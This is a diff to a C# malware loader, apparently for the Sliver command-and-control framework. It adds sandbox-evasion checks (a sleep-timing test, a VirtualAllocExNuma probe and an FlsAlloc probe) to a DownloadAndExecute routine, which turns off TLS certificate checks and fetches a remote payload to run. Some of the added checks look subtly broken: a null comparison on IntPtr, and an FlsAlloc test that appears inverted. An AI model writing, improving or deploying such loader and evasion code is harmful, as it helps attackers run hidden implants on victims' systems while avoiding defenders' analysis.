@@ -115,12 +115,42 @@ namespace SliverLoader
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 FlsAlloc(IntPtr lpCallback);
 
         private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
         private static UInt32 MEM_COMMIT = 0x1000;
 
         public static void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, byte[] AESKey, byte[] AESIV)
         {
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 1.5)
+            {
+                return;
+            }
+
+            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            if (mem == null)
+            {
+                return;
+            }
+
+            UInt32 result = FlsAlloc(IntPtr.Zero);
+            if (result != 0xFFFFFFFF)
+            {
+                return;
+            }
 
             ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
             System.Net.WebClient client = new WebClientWithTimeout();
